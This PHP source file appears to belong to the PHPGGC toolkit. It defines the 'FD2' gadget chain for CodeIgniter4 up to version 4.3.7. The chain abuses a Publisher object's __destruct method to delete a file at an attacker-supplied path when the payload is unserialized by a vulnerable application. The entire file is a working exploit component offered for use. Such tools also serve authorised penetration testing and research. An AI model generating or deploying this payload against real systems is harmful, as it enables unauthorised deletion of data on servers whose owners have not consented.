<?php

namespace GadgetChain\CodeIgniter4;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 4.3.7';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '';

    public function generate(array $parameters)
    {
        return new \CodeIgniter\Publisher\Publisher($parameters['remote_path']);
    }
}